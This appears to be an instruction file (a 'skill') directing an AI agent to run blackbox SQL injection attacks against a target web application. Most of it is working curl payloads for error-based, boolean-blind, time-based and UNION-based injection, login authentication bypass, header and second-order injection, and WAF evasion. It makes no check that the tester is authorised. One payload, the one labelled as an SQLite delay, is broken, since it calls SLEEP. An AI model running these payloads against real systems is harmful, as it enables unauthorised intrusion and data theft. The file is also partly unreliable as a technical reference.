---
name: blackbox-sqli
description: >-
  Actively test a target web application for SQL Injection vulnerabilities
  using blackbox techniques. Reads the target map from pentest/target-map.md,
  injects SQL payloads into every identified parameter (query strings, form
  fields, JSON body, path parameters, headers, cookies), detects boolean-based,
  error-based, and time-based blind SQLi, and writes confirmed findings with
  PoC curl commands to pentest/sqli-results.md. Use when asked to find SQL
  injection in a blackbox pentest.
---

# Blackbox SQL Injection Detection

You are actively testing a web application for SQL Injection vulnerabilities without source code access. You will inject payloads into every identified parameter and analyze responses for signs of injection.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## What You Are Looking For

SQL injection occurs when user-supplied input is embedded into an SQL query without proper parameterization. In blackbox testing, you detect it through:

1. **Error-based**: Database error messages appear in the response (MySQL, PostgreSQL, MSSQL, Oracle error strings)
2. **Boolean-based blind**: The application responds differently to `AND 1=1` vs `AND 1=2` (true vs false conditions)
3. **Time-based blind**: The application delays its response when you inject `SLEEP(5)` or `WAITFOR DELAY '0:0:5'`
4. **Union-based**: You can inject a `UNION SELECT` to extract data directly into the response

---

## Phase 1: Target Identification

Read `pentest/target-map.md` and identify all parameters to test:

1. **URL query string parameters**: `?id=1`, `?search=test`, `?category=electronics`
2. **Path parameters**: `/users/1`, `/products/abc`
3. **Form fields**: username, password, search, comment, email fields
4. **JSON body fields**: any string or numeric field in POST/PUT/PATCH requests
5. **HTTP headers**: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie` values
6. **Cookie values**: session tokens using predictable formats, preference values

Write your test plan to `pentest/sqli-recon.md`:
```markdown
# SQLi Test Candidates
## Parameters to Test
### 1. [Endpoint + Parameter name]
- Endpoint: METHOD /path
- Parameter: name (location: query/body/header/cookie)
- Sample value: [current value]
- Auth required: yes/no
```

---

## Phase 2: Injection Testing

For each candidate parameter, run these tests in order. Stop testing a parameter early if you confirm SQLi.

### Test 1: Error Triggering

Inject a single quote and observe the response for database errors:

```bash
# Query parameter
curl -sk "<TARGET_URL>/endpoint?param=test'"

# JSON body
curl -sk -X POST "<TARGET_URL>/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"field":"test'"'"'"}'

# Form POST
curl -sk -X POST "<TARGET_URL>/endpoint" \
  -d "field=test'"
```

**Signs of vulnerable**:
- `You have an error in your SQL syntax` → MySQL
- `ORA-00907` / `ORA-00933` → Oracle
- `pg_query()` / `unterminated quoted string` → PostgreSQL
- `Unclosed quotation mark` / `Incorrect syntax near` → MSSQL
- `SQLite3::` / `SQLITE_ERROR` → SQLite
- Any raw SQL query visible in the response
- HTTP 500 error that wasn't there with normal input

### Test 2: Boolean-Based Blind

Inject true and false conditions and compare responses:

```bash
# True condition (should give same result as original)
curl -sk "<TARGET_URL>/endpoint?id=1 AND 1=1--"

# False condition (should give different/empty result)
curl -sk "<TARGET_URL>/endpoint?id=1 AND 1=2--"
```

For string parameters:
```bash
# True
curl -sk "<TARGET_URL>/search?q=test' AND '1'='1"

# False
curl -sk "<TARGET_URL>/search?q=test' AND '1'='2"
```

**Signs of vulnerable**: Response length, content, or status code differs between the true and false payloads.

### Test 3: Time-Based Blind

Inject time delays and measure response time:

```bash
# MySQL: SLEEP(5) — expect ~5 second delay
curl -sk -w "\nTime: %{time_total}s\n" \
  "<TARGET_URL>/endpoint?id=1 AND SLEEP(5)--"

# PostgreSQL: pg_sleep(5)
curl -sk -w "\nTime: %{time_total}s\n" \
  "<TARGET_URL>/endpoint?id=1;SELECT pg_sleep(5)--"

# MSSQL: WAITFOR DELAY
curl -sk -w "\nTime: %{time_total}s\n" \
  "<TARGET_URL>/endpoint?id=1;WAITFOR DELAY '0:0:5'--"

# SQLite: RANDOMBLOB heavy computation (blind delay)
curl -sk -w "\nTime: %{time_total}s\n" \
  "<TARGET_URL>/endpoint?id=1 AND 1=(SELECT 1 FROM (SELECT SLEEP(5)) x)--"
```

**Signs of vulnerable**: Response takes noticeably longer (~5s) compared to baseline.

### Test 4: Union-Based Extraction (if error or boolean confirmed)

First, determine the number of columns:
```bash
# Increment ORDER BY until error
curl -sk "<TARGET_URL>/endpoint?id=1 ORDER BY 1--"
curl -sk "<TARGET_URL>/endpoint?id=1 ORDER BY 2--"
curl -sk "<TARGET_URL>/endpoint?id=1 ORDER BY 3--"
# Error on N means N-1 columns
```

Then inject UNION SELECT:
```bash
# For MySQL (2 columns example)
curl -sk "<TARGET_URL>/endpoint?id=-1 UNION SELECT 1,2--"
curl -sk "<TARGET_URL>/endpoint?id=-1 UNION SELECT @@version,2--"
curl -sk "<TARGET_URL>/endpoint?id=-1 UNION SELECT user(),database()--"

# For PostgreSQL
curl -sk "<TARGET_URL>/endpoint?id=-1 UNION SELECT version(),2--"

# For MSSQL
curl -sk "<TARGET_URL>/endpoint?id=-1 UNION SELECT @@version,2--"
```

### Test 5: Authentication Bypass Payloads

Test login endpoints specifically:
```bash
# Classic bypass
curl -sk -X POST "<TARGET_URL>/login" \
  -d "username=admin'--&password=anything"

curl -sk -X POST "<TARGET_URL>/login" \
  -d "username=admin'/*&password=*/'1'='1"

curl -sk -X POST "<TARGET_URL>/login" \
  -d "username=' OR '1'='1&password=' OR '1'='1"

# JSON login
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'
```

**Signs of vulnerable**: Successful login without valid credentials, or access to admin account.

### Test 6: Header Injection

```bash
# User-Agent injection
curl -sk "<TARGET_URL>/" \
  -H "User-Agent: Mozilla' AND SLEEP(5)--"

# X-Forwarded-For injection
curl -sk "<TARGET_URL>/" \
  -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--"

# Referer injection
curl -sk "<TARGET_URL>/" \
  -H "Referer: https://attacker.com/' AND SLEEP(5)--"
```

---

## Phase 3: Second-Order SQLi

Check if input is stored and then used in a query later:

1. Register/create an account or record with an injection payload as a field value:
   ```bash
   curl -sk -X POST "<TARGET_URL>/register" \
     -d "username=admin'--&email=test@test.com&password=pass123"
   ```

2. Then access a page that would read and use that stored value in a SQL query:
   ```bash
   curl -sk "<TARGET_URL>/profile" -H "Cookie: session=<session>"
   ```

If errors appear on retrieval that didn't appear on insertion → second-order SQLi.

---

## Output Format

Write confirmed findings to `pentest/sqli-results.md`:

```markdown
# SQL Injection Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED] Endpoint - Parameter Name

- **Endpoint**: `GET /api/users?id=1`
- **Parameter**: `id` (query string)
- **Injection Type**: [Error-based / Boolean-blind / Time-based / Union-based]
- **Database**: [MySQL / PostgreSQL / MSSQL / SQLite / Oracle]
- **Impact**: Full database read access; potential write/delete; possible OS command execution (if xp_cmdshell or UDF available)
- **Evidence**: [Description of what was observed — error message, response difference, time delay]
- **PoC**:
  ```bash
  # Confirm SQLi (time-based)
  curl -sk -w "\nTime: %{time_total}s\n" \
    "https://target.com/api/users?id=1 AND SLEEP(5)--"
  # Expected: ~5 second delay

  # Extract database version
  curl -sk "https://target.com/api/users?id=-1 UNION SELECT @@version,2--"
  ```
- **Remediation**: Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.

### [LIKELY] Endpoint - Parameter Name

- **Endpoint**: `POST /search`
- **Parameter**: `query` (JSON body)
- **Evidence**: [Boolean condition produces different response lengths — needs further confirmation]
- **PoC**:
  ```bash
  # True condition (returns results)
  curl -sk -X POST "https://target.com/search" \
    -H "Content-Type: application/json" \
    -d '{"query":"test'\'' AND '\''1'\''='\''1"}'

  # False condition (empty/different response)
  curl -sk -X POST "https://target.com/search" \
    -H "Content-Type: application/json" \
    -d '{"query":"test'\'' AND '\''1'\''='\''2"}'
  ```
- **Remediation**: Use parameterized queries.
```

After writing results, delete `pentest/sqli-recon.md` and any `pentest/sqli-batch-*.md` files.

---

## Important Reminders

- Always establish a baseline response (normal input) before injection testing.
- Use URL encoding when needed: `'` = `%27`, space = `%20`, `--` = `%2D%2D`
- Test both URL-encoded and raw payloads — WAFs may block one but not the other.
- For time-based blind: run each sleep payload twice to rule out slow network — if consistently slow, it's real.
- If a WAF is detected (403 responses, Cloudflare/ModSecurity error pages), try:
  - Case variation: `sElEcT`, `SeLeCt`
  - Comment obfuscation: `/**/`, `/*!*/`
  - URL encoding: `%27` for `'`
  - Double encoding: `%2527`
- Do NOT use automated tools that send thousands of requests — be targeted and methodical.
- If authentication is required, use any test credentials or tokens provided.
- Clean up: delete `pentest/sqli-recon.md` after writing `pentest/sqli-results.md`.
